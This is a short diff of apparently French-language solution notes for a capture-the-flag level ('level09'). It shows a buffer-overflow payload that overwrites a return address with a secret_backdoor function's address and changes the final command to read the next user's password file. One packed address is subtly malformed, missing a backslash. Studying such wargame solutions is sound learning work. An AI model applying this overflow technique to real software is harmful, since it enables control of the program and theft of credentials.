@@ -21,4 +21,7 @@ Adresse de secret_backdoor = 0x000055555555488c "\x8c\x48\x55\x55\x55\x55\x00\x0
 Adresse de '/bin/sh'       = 0x00007ffff7b94d0f "\x0f\x4d\xb9\xf7\xff\x7f\x00\x00"
 
 
-(python -c 'print "A"*40 + "\xfa"'; python -c 'print "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "x80\x75\xa5\xf7\xff\x7f\x00\x00"' ; cat) | ./level09
+=======================================================================================================================================
+
+
+(python -c 'print "A"*40 + "\xfa"'; python -c 'print "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "x80\x75\xa5\xf7\xff\x7f\x00\x00"' ; echo 'cat /home/users/end/.pass') | ./level09
